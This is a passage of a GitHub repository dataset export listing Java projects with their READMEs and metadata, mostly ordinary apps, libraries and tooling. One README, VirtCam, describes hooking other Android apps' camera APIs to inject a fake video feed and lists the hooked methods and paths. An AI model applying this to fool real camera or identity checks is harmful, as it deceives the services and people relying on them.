Recuerda extender CommandLineRunner en la clase de Spring, sobrescribiendo el método run para llamar al menú creado.

## 🔨 Objetivos del proyecto

- El objetivo del proyecto es practicar la modelización de clases y relaciones utilizando Spring Data JPA;
- Es importante describir e implementar correctamente la relación entre Artista y Canción, dado que un artista puede estar asociado a más de una canción;
- Una canción solo debe ser guardada en la base de datos si el Artista ha sido previamente registrado;
- Practicaremos consultas derivadas y JPQL para verificar si el artista ya está registrado y buscar canciones por un determinado artista;
- Realizaremos la integración con la API de ChatGPT para buscar información sobre un determinado artista.

### ¡Buen desafío! 



",,,2024-04-01T18:36:24Z,2024-04-01T18:38:30Z,,0,2,0,2,0,5,20,1,0,,Java
Kooperlol/Blockify,master,"<div align=""center"">
    <img src=""public/blockify.png"" width=""320"" height=""320"">
</div>

[![](https://img.shields.io/github/license/kooperlol/blockify.svg)](https://github.com/Kooperlol/Blockify/blob/master/LICENSE.md) [![](https://jitpack.io/v/Kooperlol/Blockify.svg)](https://jitpack.io/#Kooperlol/Blockify) [![](https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/HeH2CuFCjz)

# About
Ever wondered how servers like FadeCloud or AkumaMC do private farms and mines?
Well, let Blockify take care of it for you! Blockify is a public library that can manage and create client-sided blocks.

Check out the [Wiki](https://github.com/Kooperlol/Blockify/wiki) to get started, and join the [Discord](https://discord.gg/BKrSKqaAZp) for help.

## Features
1. **Stage Management**: Blockify has different stages for an audience. Each stage has multiple ""views"", which represent different patterns within a stage.
2. **Block Interaction Events**: The project handles block interaction events, such as starting to dig a block, as seen in the `BlockDigAdapter` class.
3. **Block Breaking Events**: Blockify also handles block-breaking events, including checking if a block is breakable and sending block change updates to the player.
4. **Chunk Loading**: The `ChunkLoadAdapter` class handles chunk-loading events, including sending block changes to the player.
5. **Game Mode Checks**: The project checks the player's game mode and adjusts block-breaking speed accordingly.
6. **Memory Management**: Blockify manages memory efficiently by using custom data types like `BlockifyPosition` and `BlockifyChunk`.
7. **Skript Support**: Blockify has a Skript Addon, [SkBlockify](https://github.com/Kooperlol/SkBlockify), that allows you to use Skript to manage client-sided blocks.
8. **Custom Events:** Blockify has a custom event `BlockifyBlockBreakEvent` that is called when a block is broken. 
9. **Complex Block Patterns:** Blockify can handle complex block patterns using the `BlockifyPattern` class. In addition, it can handle setting crop ages and other custom block data.
10. **Custom Mining Speeds:** Blockify allows for custom mining speeds which you can set for a player in an audience.

## Credits
- **[Kooper](https://github.com/Kooperlol)**: Project Lead
- **[Zora](https://github.com/ReportCardsMC)**: Mentor

## Inspiration
- **[GhostCore](https://github.com/QuarryMC/GhostCore)**: The project was inspired by GhostCore, code that manages client-sided blocks for Quarry (an OP Prison server).

## Dependencies
- [PacketEvents](https://github.com/retrooper/packetevents)

## Statistics
Check out our [bStats page](https://bstats.org/plugin/bukkit/Blockify/21782)
",A client-sided block library for Minecraft,"api,blocks,client-side,java,minecraft,packets,paper,papermc,spigot,utils",2024-05-01T01:03:52Z,2024-07-21T02:44:06Z,2024-07-21T02:44:06Z,16,4,12,108,0,2,20,5,0,MIT,Java
32patient/EasyPan,main,"# EasyPan

EasyPan是一个基于 Spring Boot 和 Vue 3 的网盘项目，旨在帮助用户上传、下载和分享文件。

该项目提供了一个方便快捷的文件管理平台，让用户能够轻松地存储和访问他们的文件。

<br>

## 技术栈

- 后端：Java Spring Boot, Spring Security, Spring Data JPA, MySQL, Redis, FFmpeg
- 前端：Vue 3, Vue Router, Vuex, Axios, Element Plus, Highlight.js
- 其他：Node.js, Webpack, Babel, Sass, SparkMD5, Vue Cookies, Vue Clipboard3, Vue PDF Embed, XLSX, DPlayer, APlayer, docx-preview

### 环境要求

在开始之前，请确保以下环境已经安装：

- Java JDK 8 或以上版本
- Node.js (建议使用 v16 或以上版本)
- MySQL 数据库
- Redis：用于缓存和Session管理
- FFmpeg：处理视频和音频文件
- Nginx：用于前端部署和反向代理
- SwitchHosts：配置 host 方便开发时的本地域名映射

<br>

### 后端项目创建和配置

在开始前，请确保你已经安装了Java JDK 8或以上版本，并且配置了Maven环境。

配置名为 ""easypan"" 的数据库，使用 Navicat 连接到 MySQL 数据库，方便查看和管理数据库的内容。

<br>

### 前端项目部署和配置

在开始前，请确保你已经安装了Node.js和npm

将""dist""目录下的文件部署进Nginx中。

<br>

### 使用QQ互联实现注册和登录
EasyPan项目使用了QQ互联作为第三方登录认证方式。为了在你的项目中实现此功能，你需要进行以下配置：

获取QQ互联的AppID和AppKey
前往QQ互联开放平台注册一个应用，获取对应的AppID和AppKey。

配置后端的QQ互联信息

<br>

#### EasyPan优点

简洁易用：EasyPan拥有直观的用户界面和用户友好的操作，无论是上传、下载还是分享文件，都能够在几步之内完成。

多媒体支持：通过集成FFmpeg、DPlayer和APlayer等工具，EasyPan支持视频、音频文件的在线播放，让用户可以在线观看或收听媒体文件。

QQ互联登录：EasyPan实现了使用QQ互联进行注册和登录的功能，用户可以方便地通过QQ账号登录，避免繁琐的注册流程。

数据安全保障：EasyPan采用了Spring Security进行用户认证和授权，通过Redis进行数据缓存，保障用户数据的安全和高效访问。

扩展性：EasyPan的后端使用Spring Boot框架，前端使用Vue 3框架，代码结构清晰，易于维护和扩展，方便添加更多功能。

EasyPan旨在为用户提供一个简单、高效的网盘服务，让用户能够轻松管理和共享自己的文件。无论是个人使用还是团队协作，EasyPan都能够满足你的需求，让文件管理变得更加便捷和愉快。

<br>

#### 联系方式
邮箱：ruimuqin@gmail.com

<br>

##### 常见问题
1. 如何配置 Nginx 来部署前端项目？

您可以参考 Nginx 的官方文档或者搜索网络上的教程，配置一个 Nginx 服务器并将前端项目部署到其中。

2. 如何配置 SwitchHosts 来映射本地域名？

SwitchHosts 是一个方便管理本地 hosts 的工具，您可以通过添加一条本地映射来实现本地域名的访问。
",Easy云盘项目,,2024-04-06T13:33:31Z,2023-07-22T19:39:22Z,,0,2,0,3,0,5,20,1,0,,Java
eternity-oop/DDD-essence-jdbc-part2,main,## 도메인주도 설계의 사실과 오해 파트2 예제,도메인 주도 설계의 사실과 오해 파트2 예제(Spring Data JDBC 버전),,2024-04-22T16:25:33Z,2024-04-23T14:33:50Z,,0,2,0,2,0,8,20,1,0,,Java
barismutluu/TurizmAcenteSistemi,master,,,,2024-04-17T22:08:19Z,2024-06-01T16:02:45Z,,0,2,0,17,0,0,19,1,0,,Java
MagicianGuo/Android-MediaProjectionDemo,master,"# 屏幕录制

通过MediaProjectionManager实现截图、投屏到小窗口、录制屏幕的功能（已适配Android14）。",测试安卓投屏显示功能,,2024-04-19T09:12:26Z,2024-06-09T09:05:26Z,2024-06-09T09:05:26Z,1,1,0,14,0,3,19,1,0,,Java
harryjackson/llm.java,main,"# llm.java

Large Language Model (LLM) example in java i.e. GPT2. This is a port of 
the [Llm.c code that lives here](https://github.com/karpathy/llm.c) written 
by @[karpathy](https://github.com/karpathy) 

## Before Running ChatGPT2 in Java

Before attempting to run this some prep work needs to happen. If you check 
the [llm.c repository](https://github.com/karpathy/llm.c) these steps are very similar. 
The reason the same code is in this repository is because LLM.c is still a moving target.

I highly recommend running the original llm.c to see it work. It's wonderful.

```bash
python -m venv .venv
source .venv/bin/activate
python -m pip install -r requirements.txt
python prepro_tinyshakespeare.py
python train_gpt2.py
```

### JVM Requirements

I used the GraalVM for this running version 21. If you're using sdkman.

```bash
sdk default java 21.0.2-graalce
```

I tested the following JVM version and they all seem to work. I have not investigated why some are slower than 
others.

1. Temurin: This ran at half the speed of Graal. I stopped it at step 10

```bash
sdk install java 21-tem
sdk use java 21-tem
```

2. Correto: This VM was also really slow compared to Graal. So I stopped it after step 10

```bash
sdk install java 21.0.3-amzn
sdk use java 21.0.3-amzn
```


## Running

Note the arguments passed to the JVM. Of particular note is ""-Djava.util.concurrent.ForkJoinPool.common.parallelism=10"", 
adjust this based on how many cores you have. The matrix multiplication methods are entirely CPU bound so adding more
threads than cores will just slow things down. 

```bash
mvn clean install;
java -jar -ea --add-modules jdk.incubator.vector --enable-preview -Xmx8g -Djava.util.concurrent.ForkJoinPool.common.parallelism=10 target/gpt2-1.0-SNAPSHOT.jar
```

## Performance

I've made no attempt to tune this for performance. The C version is still much faster than this version. There are 
some low-hanging fruit like parallelizing some of the loops. I made the matmul_forward and matmul_backward both 
parallel because it was painfully slow without it.
",llm in java i.e. GPT2,,2024-04-16T01:54:39Z,2024-05-05T07:35:27Z,,0,1,0,9,0,3,19,3,0,MIT,Java
eclipse-4diac/4diac-ide,release,"# Eclipse 4diac's 4diac IDE

[4diac IDE](https://eclipse.dev/4diac/en_ide.php) is an integrated development environment for developing distributed Industrial Process Measurement and Control Systems (IPMCS) utilizing the IEC 61499 standard. 

## License

4diac IDE is licensed under an [EPL 2.0](LICENSE.md).

## Contributing

We use [contribution policy](CONTRIBUTING.md), which means we can only accept contributions under
the terms of [Eclipse Contributor Agreement](http://www.eclipse.org/legal/ECA.php).


## Building 4diac IDE

For building 4diac IDE simple run

   `mvn install`
   
in the root directory of 4diac IDE source code. After the build completes you can find 4diac IDE packages for Windows, Linux and MacOS in the directory:
    
   `plugins/org.eclipse.fordiac.ide.product/target` 

More information on how to build, run and extend 4diac IDE can be found in our [Building 4diac IDE Documentation](https://www.eclipse.org/4diac/en_help.php?helppage=html/development/building4diac.html)


## Links

* [Home page](https://www.eclipse.org/4diac)
* [Documentation](https://www.eclipse.org/4diac/en_help.php) 
* [Mailing list](https://dev.eclipse.org/mailman/listinfo/4diac-dev)
* [Wiki](https://wiki.eclipse.org/Eclipse_4diac_Wiki)
* [Examples](https://github.com/eclipse-4diac/4diac-examples)
* [4diac IDE Nightly builds](https://download.eclipse.org/4diac/updates/nightly)


## Issue/bug trackers

* [4diac IDE Github Issues](https://github.com/eclipse-4diac/4diac-ide/issues)

",,,2024-04-04T11:51:35Z,2024-05-25T19:09:45Z,,0,33,514,2471,20,28,19,4,2,EPL-2.0,Java
asdflj/AE2Things,main,"AE2Things
Neat little additions to AE2-GTNH

This mod adds a new type of cell the DISK: Deep Item Storage disk. This cell has no type limits.

**Infinity cell**</br>
Can set link mode to link other infinity cell. It will share stored items
![infinity_cell_link.png](blob/infinity_cell_link.png)


**Backpack Terminal**</br>
Can easily manage the items in the backpack, support magnet mode and fluid
![backpack_terminal.png](blob/backpack_terminal.png)
![backpack_terminal_2.png](blob/backpack_terminal_2.png)
**Dual Interface Terminal**</br>
Support encode pattern
![dual_interface_terminal.png](blob/dual_interface_terminal.png)
**Infusion Pattern Terminal**</br>
Support infusion recipe and distillation recipe,Can order fluid and essentia
![infusion_pattern_terminal.gif](blob/infusion_pattern_terminal.gif)
![infusion_pattern_terminal_2.gif](blob/infusion_pattern_terminal_2.gif)
![infusion_pattern_terminal.png](blob/infusion_pattern_terminal.png)
**Essentia discretizer**</br>
**Thaumatorium Interface**</br>
**Infusion Interface**</br>
support infusion intercepter
![infusion_interface_2.png](blob/infusion_interface_2.png)
**Wireless Connector Terminal**</br>
Can easily manage ae2 stuff wireless connector
![wireless_connector.png](blob/wireless_connector.png)</br>
![fishbig.png](blob/fishbig.png)
",This mod adds a new type of cell the DISK: Deep Item Storage disK. This cell has no type limits.,,2024-04-05T10:07:19Z,2024-09-25T22:36:17Z,2024-09-25T22:36:17Z,16,1,16,176,0,0,19,1,2,MIT,Java
hldfight/Tai-e-WebPlugin,main,"# Tai-e-WebPlugin

详情可关注公众号：小胖的安全之旅

https://mp.weixin.qq.com/s/ywoT5J5wSXdCZ-jcfzj7ng （Tai-e: Web插件开发）

https://mp.weixin.qq.com/s/s18-zKgz-AEH4nUxpYZmaQ （Tai-e: Web插件开发（续））

https://xz.aliyun.com/t/14525 （Tai-e: Mybatis完整解决方案）
",Tai-e的Web插件,,2024-04-25T06:59:38Z,2024-06-11T06:51:57Z,,0,1,0,12,0,1,19,1,0,,Java
aaaademo/ysuserial-mod,master,,,,2024-04-27T14:06:48Z,2024-09-26T09:50:49Z,,0,1,0,25,0,8,19,1,1,MIT,Java
itsJohnCnstn/service-template,main,"# Service Template

Service template for new microservices.

## Tech Stack

- Java 21
- Gradle
- Spring Boot (Web, Data JPA)
- OpenAPI
- PostgreSQL + Flyway
- Docker + Docker Compose
- Spring Test + JUnit 5 + Mockito + AssertJ + Testcontainers
- Lombok, MapStruct

## Architecture

PostgreSQL was chosen as the database. It's is an open source object-relational database system with over 30 years of
active development that has earned it a strong reputation for reliability, feature robustness, and performance.

Openapi was chosen for designing, building, documenting and consuming REST APIs.

Kotlin was chosen for configuring Gradle.

CheckStyle, Jacoco and Pmd plugins were chosen for supporting quality and reliable code.

## Getting Started

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes.

### Prerequisites

Project requires Java 21, Make, Docker.

### Installing

Instructions for Java: [AdoptOpenJDK installation](https://adoptopenjdk.net/installation.html?variant=openjdk11)

Instructions for Docker: [Docker installation](https://docs.docker.com/v17.12/install/)

Instructions for Make: [Install make on Windows](http://gnuwin32.sourceforge.net/packages/make.htm)

Build the project:

### Running with Make

#### Running infra using docker-compose

```bash
make docker-compose-up-infra
```

#### Running everything using docker-compose 

```bash
make docker-compose-up
```

## Contributing

When adding new feature to project make sure code satisfies rules made with CheckStyle, Pmd plugins.
Useful documentation:

For CheckStyle: [CheckStyle Rules](https://checkstyle.sourceforge.io/config_coding.html)

For Pmd: [Pmd Java Rules](https://pmd.github.io/pmd-6.20.0/pmd_rules_java_codestyle.html#shortvariable)

Also, minimal test coverage must be 75%. For more information visit
[Jacoco Documentation](https://www.jacoco.org/jacoco/trunk/doc/)
",Service template for Spring Java microservices,"docker,flyway,gradle,java,microservices,openapi,postgresql,rest,service-template,spring",2024-04-11T17:59:27Z,2024-08-16T11:57:43Z,,0,1,0,48,0,0,19,28,0,,Java
wrlu/VirtCam,main,"# VirtCam
Android Virtual Camera
> Warning: This project is for study usage only, DO NOT use it for illegal purposes.

# Usage
Inject video path: 
```
/sdcard/Android/data/{hooked_package_name}/files/ccc/virtual.mp4
```
This video will be decoded and save frames to this path (can be deleted after hooked manually):
```
/sdcard/Android/data/{hooked_package_name}/files/decode_video_{random_uuid}/
```
(Optional) Saved preview callback frames to this path (can be deleted after hooked manually):
```
/sdcard/Android/data/{hooked_package_name}/files/dump_frame_{random_uuid}/
```

# Hooked APIs:
```
android.hardware.Camera#setPreviewTexture
android.hardware.Camera#setPreviewDisplay
android.hardware.Camera#startPreview
android.hardware.Camera#setPreviewCallback
android.hardware.Camera$PreviewCallback#onPreviewFrame
```

# Credits
* VCam: https://github.com/Xposed-Modules-Repo/com.example.vcam
* Android-VideoToImages: https://github.com/zhantong/Android-VideoToImages",Android Virtual Camera,,2024-04-19T07:07:05Z,2024-04-23T03:29:38Z,,0,1,0,2,0,12,19,1,0,,Java
furkankayam/tc-validation,master,,✅Verifying Turkish citizenship status with the entered information,"tc,turkish-citizenship-verification",2024-05-01T10:38:38Z,2024-05-04T15:59:30Z,2024-05-04T03:20:07Z,2,1,0,21,0,0,18,1,0,MIT,Java
rohatdgnr/TourismAgency,main,"<img src =""rohatt.png""/>



# Patika Turizm Acentesi Turizm Acente Sistemi

Bu proje, Patika Turizm Acentesi'nin günlük operasyonlarını dijital bir platforma taşımak için geliştirilmiş bir yazılım çözümüdür. Bu yazılım, otel yönetimi, oda yönetimi, dönem yönetimi, fiyat yönetimi, oda arama ve rezervasyon işlemleri gibi bir dizi özelliği içermektedir.
# Kullanılan Teknolojiler

- Java
- Java Swing (GUI)
- PostgreSQL

 
 # Kurulum

- Bu projeyi klonlayın.
- PostgreSQL veritabanında turizmacentesistemi adında bir veritabanı oluşturun.
- turizmacentesistemi.sql dosyasını kullanarak veritabanı tablolarını oluşturun. Veritabanı bağlantısını yapılandırmak için DatabaseConnection.java dosyasını düzenleyin.

  
# Proje Yapısı

- business: İş mantığını gerçekleştiren servis sınıfları

- core: Dizini altında veritabanı oluşturma dosyası, bulunmaktadır.

- dao: Veritabanı işlemlerini gerçekleştiren DAO (Data Access Object) sınıfları

- entity: Veritabanı tablolarını temsil eden model sınıfları

- views: Kullanıcı arayüzünü oluşturan Swing GUI sınıfları


# Projenin videoya alınmış hali aşağıdaki linkte mevcuttur.

- https://www.youtube.com/watch?v=RrVL1pAHLcM&t=4s


# Proje ile ilgili görseller :

- Giriş Ekranı

<img src =""img.png""/>

- Admin Kullanıcısının Ekranı :

<img src =""img_1.png""/>

- Employee(Çalışan) Kullanıcısın Ekranları :

<img src =""img_2.png""/>

<img src =""img_3.png""/>

<img src =""img_4.png""/>

<img src =""img_5.png""/>

<img src =""img_6.png""/>

<img src =""img_7.png""/>
",The main purpose of this project is to enable businesses operating in the hotel sector to manage their daily operations more effectively and optimize customer reservation processes.,"java,postgresql,swing",2024-04-22T23:04:15Z,2024-09-20T20:49:01Z,,0,2,0,30,0,0,18,1,0,MIT,Java
phegondev/users-management-system,master,"# users-management-system

## Clone and checkout to the branch of the technology you want to use and view the code. Fell free to run and test

<img width=""1435"" alt=""Screenshot 2024-04-08 at 21 29 30"" src=""https://github.com/phegondev/users-management-system/assets/64640469/5c24913d-fa7d-4d85-b0a9-dfc3c87b51fd"">

<img width=""1262"" alt=""Screenshot 2024-04-08 at 21 29 53"" src=""https://github.com/phegondev/users-management-system/assets/64640469/15f3b644-4d31-4ae5-bb23-a418ca037eb1"">
<img width=""1028"" alt=""Screenshot 2024-04-08 at 21 30 08"" src=""https://github.com/phegondev/users-management-system/assets/64640469/ef01cef9-50e0-4766-a003-035af91701cb"">
",,,2024-04-05T10:14:44Z,2024-04-08T20:55:17Z,,0,1,0,3,0,18,18,3,0,,Java
3arthqu4ke/mc-runtime-test,main,"<h1 align=""center"" style=""font-weight: normal;""><b>Mc-Runtime-Test</b></h1>
<p align=""center"">Run the Minecraft client inside your CI/CD pipeline.</p>
<p align=""center"">Mc-Runtime-Test | <a href=""https://github.com/3arthqu4ke/headlessmc"">HMC</a> | <a href=""https://github.com/3arthqu4ke/hmc-specifics"">HMC-Specifics</a> | <a href=""https://github.com/3arthqu4ke/hmc-optimizations"">HMC-Optimizations</a></p>

<div align=""center"">

[![CodeFactor](https://www.codefactor.io/repository/github/3arthqu4ke/mc-runtime-test/badge/main)](https://www.codefactor.io/repository/github/3arthqu4ke/mc-runtime-test/overview/main)
[![GitHub All Releases](https://img.shields.io/github/downloads/3arthqu4ke/mc-runtime-test/total.svg)](https://github.com/3arthqu4ke/mc-runtime-test/releases)
![](https://github.com/3arthqu4ke/mc-runtime-test/actions/workflows/run-matrix.yml/badge.svg)
![GitHub](https://img.shields.io/github/license/3arthqu4ke/mc-runtime-test)
![Github last-commit](https://img.shields.io/github/last-commit/3arthqu4ke/mc-runtime-test)

</div>

> [!WARNING]
> NOT AN OFFICIAL MINECRAFT PRODUCT. NOT APPROVED BY OR ASSOCIATED WITH MOJANG OR MICROSOFT.

This action runs the Minecraft client inside your CI/CD pipeline.

When coding Minecraft mods many bugs can only be caught at runtime.
Between many different versions and modloaders manual testing becomes laborious.
Additionally, many (e.g. mapping or mixin related) bugs only occur when running against a Minecraft instance that has been launched by a launcher, instead of some IDE or gradle task.

This action runs the Minecraft client using the [HeadlessMC](https://github.com/3arthqu4ke/headlessmc) launcher.
It uses Xvfb as a virtual framebuffer that allows us to run the game headlessly.
HeadlessMC can also be used to patch the lwjgl library.

This project also provides mods for several versions, which all do one thing: join a single-player world, wait for chunks to load,
and then quit the game after a few seconds.
This way you can already run simple boot tests, checking whether the game will boot with your mod.
Mods for newer versions also execute all [gametests](https://www.minecraft.net/en-us/creator/article/get-started-gametest-framework)
registered.

Mc-Runtime-Test currently supports the following Minecraft versions and modloaders:
You can configure it to use any other version, but in that case you need to set `mc-runtime-test` to `none` and provide another way for the game to exit, or the workflow will run indefinitely.

<div align=""center"">
  
| Version  | Forge | Fabric | NeoForge | 
| :-: | :-: | :-: | :-: |
| 1.21 - 1.21.1  | :white_check_mark:  | :white_check_mark:  | :white_check_mark: |
| 1.20.2 - 1.20.6  | :white_check_mark:  | :white_check_mark:  | :white_check_mark: |
| 1.20.1  | :white_check_mark:  | :white_check_mark:  | :warning:  |
| 1.19 - 1.19.4  | :white_check_mark:  | :white_check_mark:  | - |
| 1.18.2  | :white_check_mark:  | :white_check_mark:  | - |
| 1.17.1  | :white_check_mark:  | :white_check_mark:  | - |
| 1.16.5  | :white_check_mark:  | :white_check_mark:  | - |
| 1.12.2  | :white_check_mark:  | :warning:  | - |
| 1.8.9  | :white_check_mark:  | :warning:  | - |
| 1.7.10  | :white_check_mark:  | :warning:  | - |

</div>

Versions marked with :warning: have not been tested yet, due to not being supported by HeadlessMC, e.g. fabric legacy versions.

# Example
```yml
name: Run the MC client
on:
  workflow_dispatch:

jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      # ... run actions to build your client
      # Copy the jar that you build to the mods folder
      - name: Copy mod jar to mods
        run: mkdir -p run/mods && cp build/libs/<your-mod>.jar run/mods
      # Call this Action to run the client
      - name: Run the MC client
        uses: 3arthqu4ke/mc-runtime-test@2.4.0
        with:
          mc: 1.20.4
          modloader: fabric
          regex: .*fabric.*
          mc-runtime-test: fabric
          java: 17
```
An example workflow in action can be found
[here](https://github.com/3arthqu4ke/hmc-optimizations/blob/1.20.4/.github/workflows/run-fabric.yml).
An example for a large matrix workflow
which tests 20 different versions of Minecraft
at once can be found 
[here](https://github.com/3arthqu4ke/hmc-specifics/blob/main/.github/workflows/run-matrix.yml).

# Inputs
- `mc`: The MC version to use, e.g. `1.20.4`.
- `modloader`: The modloader to install with HeadlessMC (`forge`, `neoforge` or `fabric`).
- `regex`: A Regex to match the MC version to launch (can in most cases just be `.*<modloader>.*`, like `.*fabric.*`, very old versions of forge might start with an uppercase `Forge`).
- `java`: The Java version to use, e.g. `17`.
- `java-distribution`: The [Java distribution](https://github.com/actions/setup-java?tab=readme-ov-file#supported-distributions) to use, by default we use the adopt distribution.
- `dummy-assets`: HeadlessMC will use dummy assets to not download all the MC assets. Can be disabled by setting this to `false`.
- `mc-runtime-test`: The MC-Runtime-Test jar to download (`none`, `lexforge`, `fabric` or `neoforge`). When using `none` you need to provide a way for the game to exit or the action will run indefinitely and time out.
- `xvfb`: If `true` (default), runs the game with Xvfb, if false, you should probably use the -lwjgl option in headlessmc.
- `headlessmc-command`: Allows you to customize the arguments of the headlessmc command.
- `fabric-api`: Downloads the fabric-api. (Default is none, an example value would be 0.97.0, to download 0.97.0+\<mc\>)
- `fabric-gametest-api`: Downloads the fabric-gametest-api to run gametests. (Default is none, an example value would be 1.3.5+85d85a934f).
- `download-hmc`: Whether to download headlessmc or not, if not you need to supply a headlessmc-launcher.jar. Default is `true`.
- `hmc-version`: The [headlessmc version](https://github.com/3arthqu4ke/headlessmc/releases) to download.

# Running your own tests
MC-Runtime-Test does not provide a framework for full integration tests.
You can, however,
use Minecrafts own [Game-Test Framework](https://www.minecraft.net/en-us/creator/article/get-started-gametest-framework).
MC-Runtime-Test will basically execute the `/test runall` command after joining the world.
On Neoforge/Lexforge gametest discovery does really not work in production, you might need to register
them themselves and use other [hacks](gametest/src/main/java/me/earth/clientgametest/mixin/MixinGameTestRegistry.java)
to get the structure templates correctly, but we are working on it.
You can also use the `headlessmc-command` input to specify additional SystemProperties with the `--jvm` flag.
E.g. `-DMcRuntimeGameTestMinExpectedGameTests=<int>` to specify how many gametests you expect to be executed
at minimum and otherwise fail if not enough gametests have been found.

# Credits
[unimined](https://github.com/unimined/unimined) by [wagyourtail](https://github.com/wagyourtail), a gradle plugin allowing us to support multiple modloaders, has greatly accelerated the development of mc-runtime-test
",Test the Minecraft client inside your CI,"github-actions,minecraft,workflows",2024-04-01T20:59:10Z,2024-08-24T14:59:25Z,2024-08-24T14:59:25Z,7,2,9,212,6,0,17,1,30,MIT,Java
nethical6/digipaws,main,,Win over screen addiction with fun & effective methods.,"app-blocker,reels-blocker,android,productivity-tool,porn-blocker",2024-04-13T10:59:42Z,2024-09-23T14:53:44Z,,7,4,35,290,0,5,17,4,2,GPL-3.0,Java
mefatihbalki/TurizmOtel,master,"Kullanılan Teknolojiler

- Java
- Java Swing (GUI)
- MySQL

Proje Yapısı src dizini altında Java kaynak kodları bulunmaktadır. 

*Entity: Veritabanı tablolarını temsil eden model sınıfları 

*Dao: Veritabanı işlemlerini gerçekleştiren DAO (Data Access Object) sınıfları 

*Business: İş mantığını gerçekleştiren servis sınıfları 

*Views: Kullanıcı arayüzünü oluşturan Swing GUI sınıfları 

*Core: Dizinin altında veritabanı oluşturma dosyası bulunmaktadır.

- Admin: Acente çalışanı ekleme, silme, güncelleme

- Acente Çalışanı (Personel) : Otel ekleme - Listeleme, Oda ekleme - Listeleme, Sezon ekleme - Listeleme, Fiyat yönetimi, Oda Arama ve Rezervasyon yapma ve Güncelleme.

Proje çalışma şekli ve işlemlerin kullanılabilirliği üzerine kısa bir kullanış videosu.
(https://www.youtube.com/watch?v=zjVaj5-O3k0)
",Turizm Otel Acente,,2024-04-22T17:13:34Z,2024-04-24T11:48:56Z,,0,2,0,10,0,0,16,1,0,,Java
HChenX/HookTool,master,"<div align=""center"">
<h1>HookTool</h1>

![stars](https://img.shields.io/github/stars/HChenX/HookTool?style=flat)
![Github repo size](https://img.shields.io/github/repo-size/HChenX/HookTool)
[![GitHub release (latest by date)](https://img.shields.io/github/v/release/HChenX/HookTool)](https://github.com/HChenX/HookTool/releases)
[![GitHub Release Date](https://img.shields.io/github/release-date/HChenX/HookTool)](https://github.com/HChenX/HookTool/releases)
![last commit](https://img.shields.io/github/last-commit/HChenX/HookTool?style=flat)
![language](https://img.shields.io/badge/language-java-purple)

<p><b><a href=""README-en.md"">English</a> | <a href=""README.md"">简体中文</a></b></p>
<p>Java 版 Hook 工具！</p>
</div>

# ✨ 工具亮点

### 1. **链式调用**

### 2. **泛型转换**

### 3. **全面丰富**

#### Tip: 重构声明: v.1.0.0 版本和之前版本有较大不同，新版本工具完成静态化，更符合工具特征，拥有更好的使用体验和性能。

# 🔧 使用方法

#### 1. 向项目 settings.gradle 文件添加如下代码。

```groovy
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        mavenCentral()
        maven { url 'https://jitpack.io' }
    }
}
```

#### 2. 向项目 app 内 build.gradle 文件添加如下代码。

```groovy
dependencies {
    // jitpack
    implementation 'com.github.HChenX:HookTool:v.1.0.3'
    // maven
    implementation 'io.github.hchenx:hooktool:v.1.0.3'
    // 二选一即可
}
```

#### 3. 同步项目，下载依赖即可在代码内调用。

#### 4. 使用工具。

- HCInit 介绍。

```java
public void init() {
    HCinit.initBasicData(); // 初始化模块基本信息
    HCinit.initStartupParam(); // 在 zygote 阶段初始化工具
    HCinit.initLoadPackageParam(); // 在 loadPackage 阶段初始化工具
    HCinit.xPrefsAutoReload(); // 是否自动更新共享首选项，默认开启
    HCinit.useLogExpand(); // 是否使用日志增强功能，具体参见方法注解
}
```

- 在 Xposed 入口处初始化本工具。

```java

@Override
public void initZygote(IXposedHookZygoteInit.StartupParam startupParam) {
    HCInit.initBasicData(new BasicData()
            .setModulePackageName(""com.hchen.demo"") // 模块包名
            .setTag(""HChenDemo"") // 日志 tag
            .setLogLevel(LOG_D) // 日志等级
            .setPrefsName(""hchen_prefs"") // prefs 存储文件名
    ); // 若有 initZygote 建议配置在这里，因为时机很早。
    HCInit.initStartupParam(startupParam); // 在 zygote 阶段初始化工具
}

@Override
public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) {
    HCInit.initLoadPackageParam(lpparam); // 在 loadPackage 阶段初始化工具
}
```

- 如果需要使用 prefs 工具或者在模块内使用本工具的 log 类，那么你还需要在模块主界面初始化。

```java
public static class MainActivity {
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        HCInit.initBasicData(new BasicData()
                .setModulePackageName(""com.hchen.demo"") // 模块包名
                .setTag(""HChenDemo"") // 日志 tag
                .setLogLevel(LOG_D) // 日志等级
                .setPrefsName(""hchen_prefs"") // prefs 存储文件名。Tip: 请保持文件名一致。
        );
    }
}
```

- 在代码处调用

```java
public class MainTest {
    public void test() {
        CoreTool.hook(/* 内容 */); // 即可 hook
        CoreTool.findClass(); // 查找类
        CoreTool.callMethod(); // 调用方法
        ChainTool.chain(""com.hchen.demo"", new ChainTool()
                .method(""method"")
                .hook()

                .method(""method"")
                .hook()
        ); // 即可链式调用
        PrefsTool.prefs().getString(); // 即可读取共享首选项
        // ......
    }
}
```

- 当然你也可以直接继承本工具打包好的类。
- // 强烈建议继承 BaseHC 使用！

```java
// Hook 方
public class MainTest extends BaseHC {
    @Override
    public void init() {
        // BaseHC 继承了 CoreTool 工具，直接调用即可。
    }

    // 可选项。
    // 时机为 zygote。
    // 使用 initZygote 必须在 hook 入口处初始化 HCInit.initStartupParam(startupParam);
    @Override
    public void initZygote(IXposedHookZygoteInit.StartupParam startupParam) {
        findClass(""com.hchen.demo.Main"", classLoader); // 此阶段均需要传递 classLoader 否则报错。
    }
}

// 执行方
public class RunHook implements IXposedHookLoadPackage, IXposedHookZygoteInit {
    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) {
        new MainTest().onLoadPackage(); // 即可在 loadPackage 阶段执行 Hook。
    }

    @Override
    public void initZygote(StartupParam startupParam) {
        new MainTest().onZygote(); // 即可在 initZygote 阶段 Hook。
    }
}

```

- 混淆配置:

```text
// 如果你不需要使用日志增强功能，也可以只加入（对于继承 BaseHC 使用的情况）:
-keep class * extends com.hchen.hooktool.BaseHC
 
// 假如你存放 hook 文件的目录为 com.hchen.demo.hook
// 如果需要使用日志增强功能，那么建议加入混淆规则:
// 如果有多个存放的目录，建议都分别加入。
-keep class com.hchen.demo.hook.**
-keep class com.hchen.demo.hook.**$*

